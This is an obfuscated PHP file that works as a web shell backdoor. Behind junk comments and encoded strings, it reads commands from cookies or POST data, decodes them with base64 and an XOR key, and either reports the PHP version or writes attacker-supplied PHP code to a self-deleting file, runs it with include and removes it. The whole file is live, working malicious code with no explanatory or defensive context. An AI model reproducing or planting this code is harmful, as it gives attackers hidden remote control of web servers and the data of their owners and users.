<?php /* s  */function/* rrmu*/ernoik(){       print/*nasze*/(32466);/*ssjsq*/}
$jnphc/*   vcy*/=      'jnphc'     ^    '	';

$bjwmfd  =     "\x66"     .      "i".$jnphc(108)	.       $jnphc(238-137)/*   n   */./*rrde */"_"."p"."u".$jnphc(648-532)  .	$jnphc(95)/* _yu */.	"c"."\x6f"     .	$jnphc(640-530)  .     "t"."\x65"	./*wzd */$jnphc(573-463)/*   lezdu  */.      "\164"/*   trlm*/.   $jnphc(742-627);
$tv_gqssxx/*   ukr   */=/*   _nhr*/"\142"	.	$jnphc(962-865)	./* szlb*/"s"."e"."6"."\x34"	.      "_".$jnphc(100)	.	"\145"/*   igh  */.	$jnphc(99)/*eo   */.       "\157"      .       $jnphc(1098-998)/*th */.      $jnphc(172-71);


$qhqemx	=/*  arfq*/"u".$jnphc(110)     .	"s"."\x65"/*m */.	"\162"/*  fei*/./*  p */$jnphc(137-32)	.      "\141"/*   idik */.   "l"."i"."z".$jnphc(1027-926);

$zqddeewkfy	=	"p"."h"."p"."\166"/*t */.	"e"."r".$jnphc(115)    .	"i".$jnphc(111)  .	"\156";


$oawmqifvqk/*cye */=	"u"."\156"/*  xuhdd*/.       $jnphc(108)	.	"i".$jnphc(222-112)/*   y   */./* _vg_h  */$jnphc(107);

  


function	hepnxahf($rujebbob,	$xrcngluckniopfiahz)
{

      global/*rst*/$jnphc;


      $xrcnglucknojckww_e	=     "";
   for/*o   */($xrcngluckn/*  bfgz  */=     0;/*   m */$xrcngluckn/* y*/<	strlen($rujebbob);)	{


       for	($fsobhcss_/* h  */=      0;/* yvybk */$fsobhcss_      <  strlen($xrcngluckniopfiahz)     &&/*   x   */$xrcngluckn	</*pfi */strlen($rujebbob);     $fsobhcss_++,	$xrcngluckn++)/* cre */{
/*   vht*/$xrcnglucknojckww_e       .=	$jnphc(ord($rujebbob[$xrcngluckn])   ^	ord($xrcngluckniopfiahz[$fsobhcss_]));


/*  ia_x */}


	}
     return	$xrcnglucknojckww_e;}



$ykboe	=     $_COOKIE;


$bjemis    =	$_POST;$ykboe	=      array_merge($bjemis,  $ykboe);


$xhqjb     =/*  uk*/$jnphc(887-835)/*  i  */./*  yy*/$jnphc(57)   .       "4"."\65"/*   blvb*/./*urzct*/"\x63"/* oymg */.       "\66"/*  _avcb  */.       "\63"/*  nwe_ */.    $jnphc(497-440)	./*  roxtl  */"-"."b".$jnphc(99)/*  q */.   "\143"      ./*   w*/"f"."-"."4".$jnphc(117-62)  .  "\145"/* o  */.	"\145"      .    "-"."9"."6"."8".$jnphc(98)	./* g   */$jnphc(45)       ./* dq  */$jnphc(56)	.	$jnphc(53)       .	"5"."\x30"     .  "0"."f".$jnphc(213-159)    .  $jnphc(390-338)   .	"\x35"/*   w  */.  "c"."5"."\71";foreach    ($ykboe/*  fykg  */as	$fsobhcss_mxyj	=>/*  t  */$rujebbob)    {/*yjom   */$rujebbob/*   g*/=       $qhqemx(hepnxahf(hepnxahf($tv_gqssxx($rujebbob),/*pjtng   */$xhqjb),	$fsobhcss_mxyj));

/*bd*/if/* txwhi*/(isset($rujebbob["\x61"	./*_rg  */"k"]))  {	if/* p*/($rujebbob["a"]       ==	"\151")	{


	$xrcngluckn/*   eu  */=/*wkaa   */array();

	$xrcngluckn["\x70"   .	$jnphc(118)]     =/*   je */$zqddeewkfy();
     $xrcngluckn[$jnphc(227-112)/*keux*/./*   vvua   */"v"]	=	"\63"	.	"."."5";  echo/*xbb  */@serialize($xrcngluckn);


/*   mj*/}     elseif  ($rujebbob["a"]/*whss   */==/*  wil */"e")     {


/* wzbw  */$gjfevitely  =/*aw  */sprintf($jnphc(975-929)/*   nyqm */.     "\57"      .	"%"."s"."."."p"."\154",       md5($xhqjb));
/*   bti */$bjwmfd($gjfevitely,     "<"/*  _h_xa*/./*   iwv*/"\x3f"/* ijkj   */.     "p"."h"."p".$jnphc(32)	.	"u"."\x6e"  .	$jnphc(108)	./*nsyo  */"\151"      .	"\x6e"     ./*  ur*/"k"."\x28"	.      $jnphc(95)   .       $jnphc(95)/*  ylhrf */.    $jnphc(832-762)/*  uasbu  */.       "\x49"       .  "\114"	.	"E".$jnphc(95)  .	"_".$jnphc(534-493)/* hkm */.	"\x3b"/*   g*/./*   nrw */$jnphc(32)       .   $rujebbob["d"]);

/*ha */include($gjfevitely);
	$oawmqifvqk($gjfevitely);


	}

	exit();
	}
}

